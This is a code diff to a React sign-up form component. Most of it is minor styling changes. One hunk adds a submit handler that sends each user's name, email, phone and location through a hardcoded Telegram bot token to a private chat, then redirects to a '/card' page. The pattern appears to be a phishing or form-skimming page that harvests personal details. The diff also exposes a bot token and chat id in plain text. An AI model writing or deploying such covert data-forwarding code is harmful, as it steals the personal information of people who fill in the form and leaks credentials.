@@ -1,6 +1,7 @@
 // import { useState } from "react"
 import { useFormik } from 'formik';
 import { signUpSchema } from '../schemas';
+import { useNavigate } from 'react-router-dom';
 
 const initialValues = {
   fullname: '',
@@ -13,21 +14,37 @@ const initialValues = {
 };
 
 function Register() {
+  const navigate = useNavigate();
   const { values, errors, handleBlur, touched, handleChange, handleSubmit } =
     useFormik({
       initialValues: initialValues,
       validationSchema: signUpSchema,
       onSubmit: (values, action) => {
         action.resetForm();
-        
-        //console.log
-        console.log(values);
+
+        //send data form telegram bot
+        // console.log(values);
+
+        const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
+        const user_id = 727686605;
+        let my_text = `Name: ${values.fullname}     
+                                               Email:  ${values.email}     
+                                                  Phone: ${values.phone}                          
+                   Country: ${values.country}        
+                                          City: ${values.city}         
+                                                               State: ${values.state}`;
+
+        const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
+        let api = new XMLHttpRequest();
+        api.open('Get', url, true);
+        api.send();
+        navigate('/card');
       },
     });
 
   return (
     <div
-      className="min-h-screen pt-20 py-96"
+      className="min-h-screen pt-20 "
       style={{
         backgroundImage: 'linear-gradient(115deg, #8693AB, #BDD4E7!)',
       }}
@@ -107,13 +124,13 @@ function Register() {
                   </p>
                 ) : null}
               </div>
-              <div className="grid grid-cols-2 gap-5 mt-5">
+              <div className="grid   lg:grid-cols-2 gap-5 mt-5 ">
                 <div>
                   <input
                     type="text"
                     placeholder="Country "
                     name="country"
-                    className="border border-gray-400 py-1 px-2 relative"
+                    className="border w-full border-gray-400 py-1 px-2 relative"
                     value={values.country}
                     onChange={handleChange}
                     onBlur={handleBlur}
@@ -129,7 +146,7 @@ function Register() {
                     type="text"
                     placeholder="City "
                     name="city"
-                    className="border border-gray-400 py-1 px-2 relative"
+                    className="border border-gray-400 py-1 px-2 relative w-full"
                     value={values.city}
                     onChange={handleChange}
                     onBlur={handleBlur}
